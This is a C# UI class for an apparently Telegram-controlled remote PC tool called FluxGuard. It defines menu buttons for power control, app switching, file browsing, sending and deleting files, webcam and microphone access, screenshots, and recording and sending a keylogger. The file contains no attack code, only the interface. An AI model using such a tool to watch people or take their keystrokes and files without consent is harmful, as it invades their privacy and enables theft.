using Telegram.Bot.Types.ReplyMarkups;
using Service;
using Languages;
using System.Diagnostics;
using System.Management;
using System.Net.NetworkInformation;
using System.Text;

namespace FluxGuard.Core
{
    public class UI_Manager
    {
        public static ReplyKeyboardMarkup Main_Keyboard;
        public static ReplyKeyboardMarkup Files_Keyboard;
        public static ReplyKeyboardMarkup Get_Keyboard;
        public static ReplyKeyboardMarkup App_Dahsboard;
        public static InlineKeyboardMarkup App_List;
        public static InlineKeyboardMarkup Power_Keyboard;
        public static ReplyKeyboardMarkup Status_Keyboard;
        public static ReplyKeyboardMarkup Drive_Keyboard;
        public static ReplyKeyboardMarkup MainFolder_Keyboard;
        public static InlineKeyboardMarkup inline_Keyboard;
        //private ReplyKeyboardMarkup rkm;

        public static void MainDashboard()
        {
            Main_Keyboard = new ReplyKeyboardMarkup("");
            KeyboardButton[] row1 =
            {
                new KeyboardButton(Lang.Translate("replykeyboards","status","status")),new KeyboardButton(Lang.Translate("replykeyboards","power","power"))
            };
            KeyboardButton[] row2 =
            {
                new KeyboardButton(Lang.Translate("replykeyboards","apps","apps")),new KeyboardButton(Lang.Translate("replykeyboards","send","send"))
            };
            KeyboardButton[] row3 =
            {
                new KeyboardButton(Lang.Translate("replykeyboards","file_explorer","file_explorer"))
            };
            KeyboardButton[] row4 =
            {
                new KeyboardButton(Lang.Translate("replykeyboards","security","security"))
            };
            KeyboardButton[] row5 =
            {
                new KeyboardButton(Lang.Translate("replykeyboards","settings","settings"))
            };
            Main_Keyboard.Keyboard = new KeyboardButton[][]
            {
                row1 , row2 , row3 , row4 , row5
            };
        }
        public static void AppDashboard()
        {
            App_Dahsboard = new ReplyKeyboardMarkup("");
            KeyboardButton[] row0 =
            {
                 new KeyboardButton(Lang.Translate("replykeyboards","apps","manage_apps"))
            };
            KeyboardButton[] row1 =
            {
                 new KeyboardButton(Lang.Translate("replykeyboards","apps","open_app"))
            };
            KeyboardButton[] row2 =
            {
                 new KeyboardButton(Lang.Translate("replykeyboards","back","back"))
            };
            App_Dahsboard.Keyboard = new KeyboardButton[][]
            {
                 row0,row1,row2
            };
        }
        public static void StatusDashboard()
        {
            Status_Keyboard = new ReplyKeyboardMarkup("");
            KeyboardButton[] row0 =
            {
                 new KeyboardButton(Lang.Translate("replykeyboards","status","resource_report")),new KeyboardButton(Lang.Translate("replykeyboards","status","driver_control"))
            };
            KeyboardButton[] row1 =
            {
                 new KeyboardButton(Lang.Translate("replykeyboards","status","uptime")),new KeyboardButton(Lang.Translate("replykeyboards","status","webcam_and_microphone"))
            };
            KeyboardButton[] row2 =
            {
                 new KeyboardButton(Lang.Translate("replykeyboards","back","back"))
            };
            Status_Keyboard.Keyboard = new KeyboardButton[][]
            {
                  row0,row1,row2
            };
        }
        public static void PowerDashbord()
        {

            var inlineMarkup = new InlineKeyboardMarkup()
            .AddButton("⭕"+Lang.Translate("inlinekeyboards","power","shutdown"),"shutdown") // first row, first button
            .AddNewRow()
            .AddButton("💤"+ Lang.Translate("inlinekeyboards", "power", "sleep"), "sleep") // second row, first button
            .AddButton("🔄️"+ Lang.Translate("inlinekeyboards", "power", "restart"), "restart");// second row, second button

            Power_Keyboard = inlineMarkup;

        }
        public static void AppList()
        {
            var inlineMarkup = new InlineKeyboardMarkup();
            foreach (var apps in Services.GetAllWindowHandleNames())
            {
                inlineMarkup.AddButton(apps,"app*"+apps);
                inlineMarkup.AddNewRow();
            }
            App_List = inlineMarkup;
        }
        public void GetDashboard()
        {
            Get_Keyboard = new ReplyKeyboardMarkup("");
            KeyboardButton[] row1 =
            {
                                    new KeyboardButton("اسکرین شات")
                                };
            KeyboardButton[] row2 =
            {
                                    new KeyboardButton("Record keylogger"),new KeyboardButton("Send keylogger")
                                };
            KeyboardButton[] row3 =
            {
                                    new KeyboardButton("ZIP file"),new KeyboardButton("Delete ZIP file")
                                };
            KeyboardButton[] row4 =
            {
                                    new KeyboardButton("Back")
                                };
            Get_Keyboard.Keyboard = new KeyboardButton[][]
            {
                                    row1,row2,row3,row4
            };
        }
        public void DriveKeyboard()
        {
            Drive_Keyboard = new ReplyKeyboardMarkup("");
            KeyboardButton[] row01 =
            {
                                    new KeyboardButton("C:/"),new KeyboardButton("D:/")
                                };
            KeyboardButton[] row02 =
            {
                                    new KeyboardButton("E:/"),new KeyboardButton("F:/")
                                };
            KeyboardButton[] row03 =
           {
                                    new KeyboardButton("Main folders"),new KeyboardButton("Open folder,file")
                                };
            KeyboardButton[] row04 =
           {
                                    new KeyboardButton("Delete file") , new KeyboardButton("Delete folder")
                                };
            KeyboardButton[] row05 =
            {
                                    new KeyboardButton("Send file"),new KeyboardButton("File info")
                                };
            KeyboardButton[] row06 =
            {
                                    new KeyboardButton("Back")
                                };
            Drive_Keyboard.Keyboard = new KeyboardButton[][]
            {
                 row01,row02,row03,row04,row05,row06
            };
        }
        public void MainFolder()
        {
            MainFolder_Keyboard = new ReplyKeyboardMarkup("");
            KeyboardButton[] row001 =
            {
                                    new KeyboardButton("Downloads"),new KeyboardButton("Desktop")
                                };
            KeyboardButton[] row002 =
            {
                                    new KeyboardButton("Document"),new KeyboardButton("Music")
                                };
            KeyboardButton[] row003 =
           {
                                    new KeyboardButton("Picture"),new KeyboardButton("Video")
                                };
            KeyboardButton[] row004 =
            {
                                    new KeyboardButton("Back")
                                };
            MainFolder_Keyboard.Keyboard = new KeyboardButton[][]
            {
                                    row001,row002,row003,row004
            };
        }

    }
}
